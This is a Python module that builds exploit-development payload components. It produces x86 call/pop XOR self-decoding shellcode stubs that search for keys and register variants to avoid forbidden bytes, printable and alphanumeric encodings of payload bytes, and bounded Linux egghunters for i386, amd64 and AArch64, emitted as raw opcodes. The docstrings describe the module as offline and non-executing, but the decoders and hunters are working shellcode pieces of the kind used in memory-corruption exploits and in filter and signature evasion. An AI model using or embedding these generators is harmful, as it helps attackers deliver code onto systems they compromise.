"""Offline shellcode encoders, transport codecs, and bounded Linux egghunters.

The module is deliberately transport-free: it only serializes bytes and exact
placement/constraint metadata.  It never executes a payload, starts a process,
opens a socket, scans host memory, or contacts a target.

Executable output is limited to small, auditable instruction sequences:

* i386/amd64 call/pop XOR decoders with deterministic register polymorphism;
* bounded Linux i386/amd64 egg scanners, optionally using a caller-declared
  ``access(2)`` syscall number and expected ``EFAULT`` value;
* a bounded, mapped-range AArch64 scanner.

Printable and alphanumeric outputs are explicitly *transport encodings*, not
shellcode.  Their metadata contains a complete offline decoder plan and labels
``executable`` as false so callers cannot confuse representation with runtime
proof.
"""
from __future__ import annotations

import base64
import hashlib
import json
import struct
from typing import Iterable, Mapping

try:
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
except ImportError:  # pragma: no cover - package-style import
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes


TransportBuildError = BuildError
MAX_BODY = 1 << 20
MAX_XOR_BODY = 255
MAX_SCAN_SPAN = 1 << 30


def _raw(value: bytes | bytearray, *, name: str, maximum: int = MAX_BODY) -> bytes:
    if not isinstance(value, (bytes, bytearray)):
        raise BuildError(f"{name} must be bytes")
    result = bytes(value)
    if not result or len(result) > maximum:
        raise BuildError(f"{name} must contain 1..{maximum} bytes")
    return result


def _bad_bytes(value: Iterable[int]) -> tuple[int, ...]:
    return reject_bad_bytes(b"", value)


def _x86_architecture(value: str) -> str:
    if not isinstance(value, str):
        raise BuildError("architecture must be text")
    aliases = {
        "x86": "i386", "i386": "i386", "x86-32": "i386",
        "x64": "amd64", "x86-64": "amd64", "amd64": "amd64",
    }
    try:
        return aliases[value.strip().lower()]
    except KeyError as exc:
        raise BuildError("architecture must be i386/x86 or amd64/x64") from exc


_XOR_POINTERS: tuple[tuple[str, int, int, int], ...] = (
    # name, pop opcode, SIB byte for [pointer + rcx - 1], jmp-r/m opcode
    ("si", 0x5E, 0x0E, 0xE6),
    ("di", 0x5F, 0x0F, 0xE7),
    ("bx", 0x5B, 0x0B, 0xE3),
)


def _xor_stub(length: int, key: int, variant: int) -> tuple[bytes, str]:
    pointer, pop_pointer, sib, jump_pointer = _XOR_POINTERS[variant]
    # jmp callsite; pop pointer; zero ecx; mov cl,len;
    # xor byte [pointer+rcx-1],key; loop; jmp pointer; call decoder.
    stub = bytes((
        0xEB, 0x0E,
        pop_pointer,
        0x31, 0xC9,
        0xB1, length,
        0x80, 0x74, sib, 0xFF, key,
        0xE2, 0xF9,
        0xFF, jump_pointer,
        0xE8, 0xED, 0xFF, 0xFF, 0xFF,
    ))
    return stub, pointer


def build_xor_decoder(
    body: bytes | bytearray,
    *,
    architecture: str,
    bad_bytes: Iterable[int] = (),
    key: int | None = None,
    variant: int | None = None,
    variant_seed: int = 0,
) -> PayloadBuild:
    """Build executable i386/amd64 call/pop XOR decoder + encoded body.

    ``variant`` selects SI/DI/BX pointer forms (0/1/2).  ``None`` searches all
    forms in a deterministic seed-rotated order.  If ``key`` is omitted, all
    non-zero octets are searched deterministically.  A result is returned only
    when the *entire* decoder and encoded body avoid every forbidden byte.
    """

    arch = _x86_architecture(architecture)
    raw = _raw(body, name="body", maximum=MAX_XOR_BODY)
    forbidden = _bad_bytes(bad_bytes)
    if isinstance(variant_seed, bool) or not isinstance(variant_seed, int) or variant_seed < 0:
        raise BuildError("variant_seed must be a non-negative integer")
    if variant is None:
        first = variant_seed % len(_XOR_POINTERS)
        variants = tuple((first + index) % len(_XOR_POINTERS)
                         for index in range(len(_XOR_POINTERS)))
    else:
        if isinstance(variant, bool) or not isinstance(variant, int) or not 0 <= variant < 3:
            raise BuildError("variant must be 0, 1, 2, or None")
        variants = (variant,)

    if key is None:
        first_key = variant_seed % 255 + 1
        keys = tuple((first_key + index - 1) % 255 + 1 for index in range(255))
    else:
        ensure_uint(key, 8, name="key")
        if key == 0:
            raise BuildError("XOR key must be non-zero")
        keys = (key,)

    rejected = set(forbidden)
    selected: tuple[bytes, bytes, str, int, int] | None = None
    for candidate_variant in variants:
        for candidate_key in keys:
            encoded = bytes(value ^ candidate_key for value in raw)
            stub, pointer = _xor_stub(len(raw), candidate_key, candidate_variant)
            candidate = stub + encoded
            if not (set(candidate) & rejected):
                selected = (candidate, encoded, pointer, candidate_key, candidate_variant)
                break
        if selected is not None:
            break
    if selected is None:
        rendered = ",".join(f"{value:02x}" for value in forbidden)
        raise BuildError(f"no XOR decoder satisfies forbidden bytes [{rendered}]")

    payload, encoded, pointer, chosen_key, chosen_variant = selected
    decoder_length = len(payload) - len(encoded)
    placements = {
        "decoder": 0,
        "decoder.pointer_pop": 2,
        "decoder.length": 6,
        "decoder.key": 11,
        "encoded_body": decoder_length,
        "decoded_entry": decoder_length,
        "end": len(payload),
    }
    widths = {
        "decoder": decoder_length,
        "decoder.pointer_pop": 1,
        "decoder.length": 1,
        "decoder.key": 1,
        "encoded_body": len(encoded),
    }
    plan = {
        "algorithm": "xor-byte",
        "direction": "reverse-index",
        "iterations": len(raw),
        "key": chosen_key,
        "entry": decoder_length,
        "clobbers": ["ecx", pointer],
        "stack_words": 1,
    }
    constraints = {
        "forbidden_bytes": [f"{value:02x}" for value in forbidden],
        "maximum_decoded_length": MAX_XOR_BODY,
        "requires_writable_code": True,
        "requires_executable_decoded_body": True,
    }
    return PayloadBuild(
        payload,
        placements,
        widths,
        architecture=arch,
        strategy="xor-call-pop-self-decoder",
        metadata={
            "decoder_plan": json.dumps(plan, sort_keys=True, separators=(",", ":")),
            "constraints": json.dumps(constraints, sort_keys=True, separators=(",", ":")),
            "key": str(chosen_key),
            "polymorphic_variant": str(chosen_variant),
            "pointer_register": ("e" if arch == "i386" else "r") + pointer,
            "decoded_sha256": hashlib.sha256(raw).hexdigest(),
            "executable": "true",
            "delivery": "none",
        },
    )


def decode_xor_body(build: PayloadBuild) -> bytes:
    """Offline inverse used for deterministic validation; never executes bytes."""

    if not isinstance(build, PayloadBuild) or build.strategy != "xor-call-pop-self-decoder":
        raise BuildError("decode_xor_body expects an XOR decoder PayloadBuild")
    try:
        key = int(build.metadata["key"])
        encoded = build.slice("encoded_body")
    except (KeyError, TypeError, ValueError) as exc:
        raise BuildError("XOR build metadata is incomplete") from exc
    if not 0 <= key <= 0xFF:
        raise BuildError("XOR key metadata is outside the 0..255 range")
    decoded = bytes(value ^ key for value in encoded)
    if hashlib.sha256(decoded).hexdigest() != build.metadata.get("decoded_sha256"):
        raise BuildError("decoded body digest mismatch")
    return decoded


_TRANSPORT_VARIANTS: Mapping[str, tuple[str, ...]] = {
    "alphanumeric": ("hex-lower", "hex-upper", "base32-unpadded"),
    "printable": ("base85", "ascii85"),
}


def _transport_encode(raw: bytes, codec: str) -> tuple[bytes, dict[str, object]]:
    if codec == "hex-lower":
        return raw.hex().encode("ascii"), {"operation": "bytes.fromhex", "padding": 0}
    if codec == "hex-upper":
        return raw.hex().upper().encode("ascii"), {"operation": "bytes.fromhex", "padding": 0}
    if codec == "base32-unpadded":
        padded = base64.b32encode(raw)
        stripped = padded.rstrip(b"=")
        return stripped, {
            "operation": "base64.b32decode",
            "padding": len(padded) - len(stripped),
        }
    if codec == "base85":
        return base64.b85encode(raw), {"operation": "base64.b85decode", "padding": 0}
    if codec == "ascii85":
        return base64.a85encode(raw, adobe=False, foldspaces=False, wrapcol=0, pad=False), {
            "operation": "base64.a85decode", "padding": 0,
        }
    raise BuildError(f"unsupported transport codec: {codec}")


def _transport_decode(payload: bytes, codec: str, padding: int) -> bytes:
    if codec in {"hex-lower", "hex-upper"}:
        return bytes.fromhex(payload.decode("ascii"))
    if codec == "base32-unpadded":
        return base64.b32decode(payload + b"=" * padding, casefold=False)
    if codec == "base85":
        return base64.b85decode(payload)
    if codec == "ascii85":
        return base64.a85decode(payload, adobe=False, foldspaces=False)
    raise BuildError(f"unsupported transport codec: {codec}")


def build_transport_encoding(
    body: bytes | bytearray,
    *,
    mode: str,
    variant: int | None = None,
    variant_seed: int = 0,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Encode bytes for an alphanumeric or printable transport channel.

    The returned bytes are not machine code.  ``decoder_plan`` records the
    exact standard-library inverse and required padding.  ``variant=None``
    searches deterministic codec variants for bad-byte compatibility.
    """

    raw = _raw(body, name="body")
    if not isinstance(mode, str) or mode.lower() not in _TRANSPORT_VARIANTS:
        raise BuildError("mode must be 'alphanumeric' or 'printable'")
    normalized = mode.lower()
    choices = _TRANSPORT_VARIANTS[normalized]
    if isinstance(variant_seed, bool) or not isinstance(variant_seed, int) or variant_seed < 0:
        raise BuildError("variant_seed must be a non-negative integer")
    if variant is None:
        first = variant_seed % len(choices)
        indices = tuple((first + index) % len(choices) for index in range(len(choices)))
    else:
        if (isinstance(variant, bool) or not isinstance(variant, int)
                or not 0 <= variant < len(choices)):
            raise BuildError(f"variant must be in 0..{len(choices) - 1} or None")
        indices = (variant,)
    forbidden = _bad_bytes(bad_bytes)
    selected: tuple[bytes, str, int, dict[str, object]] | None = None
    for index in indices:
        codec = choices[index]
        encoded, plan = _transport_encode(raw, codec)
        if not (set(encoded) & set(forbidden)):
            selected = (encoded, codec, index, plan)
            break
    if selected is None:
        raise BuildError("no transport variant satisfies the forbidden-byte set")
    encoded, codec, chosen_variant, plan = selected
    if normalized == "alphanumeric" and not all(chr(value).isalnum() and value < 128 for value in encoded):
        raise BuildError("internal alphanumeric codec emitted a non-alphanumeric byte")
    if normalized == "printable" and not all(0x21 <= value <= 0x7E for value in encoded):
        raise BuildError("internal printable codec emitted an out-of-range byte")
    decoded = _transport_decode(encoded, codec, int(plan["padding"]))
    if decoded != raw:
        raise BuildError("internal transport codec failed its round-trip")

    decoder_plan = {
        **plan,
        "codec": codec,
        "input_length": len(encoded),
        "output_length": len(raw),
        "executable_decoder_included": False,
    }
    constraints = {
        "byte_class": normalized,
        "forbidden_bytes": [f"{value:02x}" for value in forbidden],
        "transport_only": True,
    }
    return PayloadBuild(
        encoded,
        {"encoded_transport": 0, "end": len(encoded)},
        {"encoded_transport": len(encoded)},
        architecture="transport-ascii",
        strategy=f"{normalized}-transport-encoding",
        metadata={
            "codec": codec,
            "decoder_plan": json.dumps(decoder_plan, sort_keys=True, separators=(",", ":")),
            "constraints": json.dumps(constraints, sort_keys=True, separators=(",", ":")),
            "polymorphic_variant": str(chosen_variant),
            "decoded_sha256": hashlib.sha256(raw).hexdigest(),
            "executable": "false",
            "delivery": "none",
        },
    )


def decode_transport_encoding(build: PayloadBuild) -> bytes:
    """Apply the explicit offline decoder plan from a transport build."""

    if not isinstance(build, PayloadBuild) or not build.strategy.endswith("-transport-encoding"):
        raise BuildError("decode_transport_encoding expects a transport PayloadBuild")
    try:
        plan = json.loads(build.metadata["decoder_plan"])
        codec = str(plan["codec"])
        padding = int(plan["padding"])
        payload = build.slice("encoded_transport")
    except (KeyError, TypeError, ValueError, json.JSONDecodeError) as exc:
        raise BuildError("transport decoder plan is incomplete") from exc
    try:
        decoded = _transport_decode(payload, codec, padding)
    except (ValueError, UnicodeError) as exc:
        raise BuildError("transport bytes violate their decoder plan") from exc
    if hashlib.sha256(decoded).hexdigest() != build.metadata.get("decoded_sha256"):
        raise BuildError("transport decoded digest mismatch")
    return decoded


class _Rel8Emitter:
    def __init__(self) -> None:
        self.code = bytearray()
        self.labels: dict[str, int] = {}
        self.fixups: list[tuple[int, str]] = []

    def emit(self, raw: bytes) -> int:
        offset = len(self.code)
        self.code.extend(raw)
        return offset

    def label(self, name: str) -> None:
        if name in self.labels:
            raise BuildError(f"duplicate internal label: {name}")
        self.labels[name] = len(self.code)

    def branch(self, opcode: int, label: str) -> None:
        self.code.extend((opcode, 0))
        self.fixups.append((len(self.code) - 1, label))

    def finish(self) -> bytes:
        for immediate, label in self.fixups:
            if label not in self.labels:
                raise BuildError(f"unresolved internal label: {label}")
            displacement = self.labels[label] - (immediate + 1)
            if not -128 <= displacement <= 127:
                raise BuildError("internal x86 branch exceeds rel8 range")
            self.code[immediate] = displacement & 0xFF
        return bytes(self.code)


def _linux_x86_hunter(
    bits: int,
    tag: bytes,
    range_start: int,
    range_end: int,
    *,
    probe: str,
    access_syscall: int | None,
    expected_efault: int | None,
    failure_address: int | None,
    variant: int,
) -> tuple[bytes, dict[str, int], dict[str, int], dict[str, object]]:
    emitter = _Rel8Emitter()
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    if bits == 32:
        emitter.emit(b"\xBA")
        placements["hunter.range_start"] = emitter.emit(struct.pack("<I", range_start))
        widths["hunter.range_start"] = 4
        emitter.emit(b"\xBD")
        placements["hunter.range_end"] = emitter.emit(struct.pack("<I", range_end))
        widths["hunter.range_end"] = 4
    else:
        emitter.emit(b"\x48\xBA")
        placements["hunter.range_start"] = emitter.emit(struct.pack("<Q", range_start))
        widths["hunter.range_start"] = 8
        emitter.emit(b"\x49\xBC")
        placements["hunter.range_end"] = emitter.emit(struct.pack("<Q", range_end))
        widths["hunter.range_end"] = 8

    emitter.label("loop")
    emitter.emit(b"\x8D\x42\x07" if bits == 32 else b"\x48\x8D\x42\x07")
    emitter.emit(b"\x39\xE8" if bits == 32 else b"\x4C\x39\xE0")
    emitter.branch(0x73, "failure")  # candidate+7 >= exclusive end

    if probe == "access":
        assert access_syscall is not None and expected_efault is not None
        emitter.emit(b"\xB8")
        placements["hunter.access_syscall"] = emitter.emit(struct.pack("<I", access_syscall))
        widths["hunter.access_syscall"] = 4
        if bits == 32:
            emitter.emit(b"\x89\xD3\x31\xC9\xCD\x80")  # ebx=edx; ecx=0; int 80
        else:
            emitter.emit(b"\x48\x89\xD7\x31\xF6\x0F\x05")  # rdi=rdx; esi=0; syscall
        emitter.emit(b"\x3C")
        placements["hunter.efault_low_byte"] = emitter.emit(bytes(((-expected_efault) & 0xFF,)))
        widths["hunter.efault_low_byte"] = 1
        emitter.branch(0x74, "next")

    if variant == 0:
        emitter.emit(b"\xB8")
        placements["hunter.tag_immediate"] = emitter.emit(tag)
        emitter.emit(b"\x89\xD7" if bits == 32 else b"\x48\x89\xD7")
    else:
        emitter.emit(b"\x89\xD7" if bits == 32 else b"\x48\x89\xD7")
        emitter.emit(b"\xB8")
        placements["hunter.tag_immediate"] = emitter.emit(tag)
    widths["hunter.tag_immediate"] = 4
    emitter.emit(b"\xAF")
    emitter.branch(0x75, "next")
    emitter.emit(b"\xAF")
    emitter.branch(0x75, "next")
    emitter.emit(b"\xFF\xE7")  # jmp edi/rdi after two SCASD operations

    emitter.label("next")
    emitter.emit(b"\x42" if bits == 32 and variant == 0 else
                 b"\x83\xC2\x01" if bits == 32 else
                 b"\x48\xFF\xC2" if variant == 0 else b"\x48\x83\xC2\x01")
    emitter.branch(0xEB, "loop")
    emitter.label("failure")
    if failure_address is None:
        emitter.emit(b"\xCC")
    elif bits == 32:
        emitter.emit(b"\xB8")
        placements["hunter.failure_address"] = emitter.emit(struct.pack("<I", failure_address))
        widths["hunter.failure_address"] = 4
        emitter.emit(b"\xFF\xE0")
    else:
        emitter.emit(b"\x48\xB8")
        placements["hunter.failure_address"] = emitter.emit(struct.pack("<Q", failure_address))
        widths["hunter.failure_address"] = 8
        emitter.emit(b"\xFF\xE0")
    assumptions = {
        "probe": probe,
        "access_syscall": access_syscall,
        "expected_efault": expected_efault,
        "range_semantics": "start-inclusive,end-exclusive",
        "read_width": 8,
        "mapped_requirement": "candidate-readable" if probe == "access" else "entire-range-readable",
        "direction_flag": "DF must be clear before entering the SCASD hunter",
        "clobbers": (
            ["eax", "ebx", "ecx", "edx", "edi", "ebp"]
            if bits == 32 and probe == "access" else
            ["eax", "edx", "edi", "ebp"]
            if bits == 32 else
            ["rax", "rcx", "rdx", "rdi", "rsi", "r11", "r12"]
            if probe == "access" else
            ["rax", "rdx", "rdi", "r12"]
        ),
    }
    return emitter.finish(), placements, widths, assumptions


class _A64Emitter:
    def __init__(self) -> None:
        self.words: list[int] = []
        self.labels: dict[str, int] = {}
        self.fixups: list[tuple[int, str, str, int]] = []

    def emit(self, word: int) -> int:
        ensure_uint(word, 32, name="AArch64 instruction")
        index = len(self.words)
        self.words.append(word)
        return index * 4

    def label(self, name: str) -> None:
        if name in self.labels:
            raise BuildError(f"duplicate internal label: {name}")
        self.labels[name] = len(self.words)

    def branch_cond(self, label: str, condition: int) -> None:
        index = len(self.words)
        self.words.append(0)
        self.fixups.append((index, label, "cond", condition))

    def branch(self, label: str) -> None:
        index = len(self.words)
        self.words.append(0)
        self.fixups.append((index, label, "direct", 0))

    def load64(self, register: int, value: int, variant: int) -> int:
        ensure_uint(register, 5, name="AArch64 register")
        ensure_uint(value, 64, name="AArch64 constant")
        order = (0, 1, 2, 3) if variant == 0 else (3, 2, 1, 0)
        start = len(self.words) * 4
        for position, halfword in enumerate(order):
            immediate = (value >> (halfword * 16)) & 0xFFFF
            base = 0xD2800000 if position == 0 else 0xF2800000
            self.emit(base | (halfword << 21) | (immediate << 5) | register)
        return start

    def finish(self) -> bytes:
        for index, label, kind, condition in self.fixups:
            if label not in self.labels:
                raise BuildError(f"unresolved internal label: {label}")
            displacement = self.labels[label] - index
            if kind == "cond":
                if not -(1 << 18) <= displacement < (1 << 18):
                    raise BuildError("AArch64 conditional branch is out of range")
                self.words[index] = 0x54000000 | ((displacement & 0x7FFFF) << 5) | condition
            else:
                if not -(1 << 25) <= displacement < (1 << 25):
                    raise BuildError("AArch64 branch is out of range")
                self.words[index] = 0x14000000 | (displacement & 0x3FFFFFF)
        return b"".join(struct.pack("<I", word) for word in self.words)


def _linux_aarch64_hunter(
    tag: bytes,
    range_start: int,
    range_end: int,
    *,
    failure_address: int | None,
    variant: int,
) -> tuple[bytes, dict[str, int], dict[str, int], dict[str, object]]:
    emitter = _A64Emitter()
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    tag_word = int.from_bytes(tag + tag, "little")
    if variant == 0:
        load_order = (("hunter.range_start", 0, range_start),
                      ("hunter.range_end", 1, range_end),
                      ("hunter.tag_encoding", 2, tag_word))
    else:
        load_order = (("hunter.tag_encoding", 2, tag_word),
                      ("hunter.range_end", 1, range_end),
                      ("hunter.range_start", 0, range_start))
    for label, register, value in load_order:
        placements[label] = emitter.load64(register, value, variant)
        widths[label] = 16

    emitter.label("loop")
    emitter.emit(0x91001C03)  # add x3, x0, #7
    emitter.emit(0xEB01007F)  # cmp x3, x1
    emitter.branch_cond("failure", 0x2)  # b.hs: candidate+7 >= exclusive end
    emitter.emit(0xF9400004)  # ldr x4, [x0]
    emitter.emit(0xEB02009F)  # cmp x4, x2
    emitter.branch_cond("found", 0x0)  # b.eq
    emitter.emit(0x91000400)  # add x0, x0, #1
    emitter.branch("loop")
    emitter.label("found")
    emitter.emit(0x91002000)  # add x0, x0, #8
    emitter.emit(0xD61F0000)  # br x0
    emitter.label("failure")
    if failure_address is None:
        emitter.emit(0xD4200000)  # brk #0
    else:
        placements["hunter.failure_address"] = emitter.load64(5, failure_address, variant)
        widths["hunter.failure_address"] = 16
        emitter.emit(0xD61F00A0)  # br x5
    assumptions = {
        "probe": "mapped",
        "access_syscall": None,
        "expected_efault": None,
        "range_semantics": "start-inclusive,end-exclusive",
        "read_width": 8,
        "mapped_requirement": "entire-range-readable",
    }
    return emitter.finish(), placements, widths, assumptions


def _linux_architecture(value: str) -> tuple[str, int]:
    if not isinstance(value, str):
        raise BuildError("architecture must be text")
    aliases = {
        "x86": ("linux-i386", 32), "i386": ("linux-i386", 32),
        "linux-i386": ("linux-i386", 32),
        "x64": ("linux-amd64", 64), "amd64": ("linux-amd64", 64),
        "linux-amd64": ("linux-amd64", 64),
        "arm64": ("linux-aarch64", 64), "aarch64": ("linux-aarch64", 64),
        "linux-aarch64": ("linux-aarch64", 64),
    }
    try:
        return aliases[value.strip().lower()]
    except KeyError as exc:
        raise BuildError("Linux hunter architecture must be i386, amd64, or aarch64") from exc


def _egg_tag(value: bytes | bytearray | str) -> bytes:
    if isinstance(value, str):
        try:
            raw = value.encode("ascii")
        except UnicodeError as exc:
            raise BuildError("egg tag must be ASCII") from exc
    elif isinstance(value, (bytes, bytearray)):
        raw = bytes(value)
    else:
        raise BuildError("egg tag must be bytes or ASCII text")
    if len(raw) != 4:
        raise BuildError("egg tag must contain exactly four bytes")
    if raw in {b"\x00" * 4, b"\xff" * 4}:
        raise BuildError("all-NUL and all-0xff tags are refused")
    return raw


def build_linux_egghunter(
    *,
    architecture: str,
    tag: bytes | bytearray | str,
    stage: bytes | bytearray,
    payload_address: int,
    range_start: int,
    range_end: int,
    probe: str = "mapped",
    access_syscall: int | None = None,
    expected_efault: int | None = None,
    separation: bytes | bytearray = b"",
    failure_address: int | None = None,
    variant: int = 0,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a bounded Linux scanner followed by ``tag + tag + stage``.

    The exclusive scan bounds and payload load address are mandatory and
    caller supplied.  ``probe='mapped'`` assumes every candidate byte is
    readable.  On i386/amd64, ``probe='access'`` requires the caller to supply
    the exact target ABI's access syscall number and positive EFAULT errno.
    AArch64 deliberately supports only mapped scans because Linux AArch64 has
    no direct pointer-form ``access`` syscall equivalent.
    """

    arch, bits = _linux_architecture(architecture)
    egg = _egg_tag(tag)
    raw_stage = _raw(stage, name="stage")
    if not isinstance(separation, (bytes, bytearray)):
        raise BuildError("separation must be bytes")
    gap = bytes(separation)
    if len(gap) > MAX_BODY:
        raise BuildError("separation exceeds payload cap")
    base = ensure_uint(payload_address, bits, name="payload_address")
    start = ensure_uint(range_start, bits, name="range_start")
    end = ensure_uint(range_end, bits, name="range_end")
    if start >= end or end - start < 8:
        raise BuildError("scan range must contain at least eight bytes")
    if end - start > MAX_SCAN_SPAN:
        raise BuildError(f"scan range exceeds {MAX_SCAN_SPAN}-byte cap")
    if isinstance(variant, bool) or not isinstance(variant, int) or variant not in {0, 1}:
        raise BuildError("variant must be 0 or 1")
    normalized_probe = probe.strip().lower() if isinstance(probe, str) else ""
    if normalized_probe not in {"mapped", "access"}:
        raise BuildError("probe must be 'mapped' or 'access'")
    if normalized_probe == "mapped":
        if access_syscall is not None or expected_efault is not None:
            raise BuildError("mapped probing does not accept syscall/errno assumptions")
    else:
        if arch == "linux-aarch64":
            raise BuildError("AArch64 hunter supports only mapped probing")
        if access_syscall is None or expected_efault is None:
            raise BuildError("access probing requires caller-supplied syscall and EFAULT")
        ensure_uint(access_syscall, 32, name="access_syscall")
        if (isinstance(expected_efault, bool) or not isinstance(expected_efault, int)
                or not 1 <= expected_efault <= 255):
            raise BuildError("expected_efault must be a positive errno in 1..255")
    if failure_address is not None:
        ensure_uint(failure_address, bits, name="failure_address")

    if arch == "linux-aarch64":
        hunter, inner_places, inner_widths, assumptions = _linux_aarch64_hunter(
            egg, start, end, failure_address=failure_address, variant=variant,
        )
    else:
        hunter, inner_places, inner_widths, assumptions = _linux_x86_hunter(
            bits, egg, start, end, probe=normalized_probe,
            access_syscall=access_syscall, expected_efault=expected_efault,
            failure_address=failure_address, variant=variant,
        )
    egg_offset = len(hunter) + len(gap)
    payload = hunter + gap + egg + egg + raw_stage
    if len(payload) > MAX_BODY:
        raise BuildError("combined egghunter payload exceeds cap")
    if base + len(payload) > 1 << bits:
        raise BuildError("payload crosses architecture address space")
    egg_address = base + egg_offset
    if not start <= egg_address or egg_address + 8 > end:
        raise BuildError("appended egg lies outside caller-supplied scan bounds")
    reject_bad_bytes(payload, bad_bytes)

    placements = {
        "hunter": 0,
        **inner_places,
        "separation": len(hunter),
        "egg.first": egg_offset,
        "egg.second": egg_offset + 4,
        "stage": egg_offset + 8,
        "end": len(payload),
    }
    widths = {
        "hunter": len(hunter),
        **inner_widths,
        "egg.first": 4,
        "egg.second": 4,
        "stage": len(raw_stage),
    }
    if gap:
        widths["separation"] = len(gap)
    constraint_plan = {
        **assumptions,
        "scan_start": start,
        "scan_end": end,
        "scan_span": end - start,
        "payload_address": base,
        "egg_address": egg_address,
        "failure_address": failure_address,
        "maximum_scan_span": MAX_SCAN_SPAN,
    }
    return PayloadBuild(
        payload,
        placements,
        widths,
        architecture=arch,
        strategy=f"linux-egghunter-{normalized_probe}",
        base_address=base,
        metadata={
            "constraint_plan": json.dumps(constraint_plan, sort_keys=True, separators=(",", ":")),
            "egg_hex": egg.hex(),
            "stage_entry_address": hex(egg_address + 8),
            "polymorphic_variant": str(variant),
            "executable": "true",
            "delivery": "none",
        },
    )


__all__ = [
    "TransportBuildError",
    "build_xor_decoder", "decode_xor_body",
    "build_transport_encoding", "decode_transport_encoding",
    "build_linux_egghunter",
]
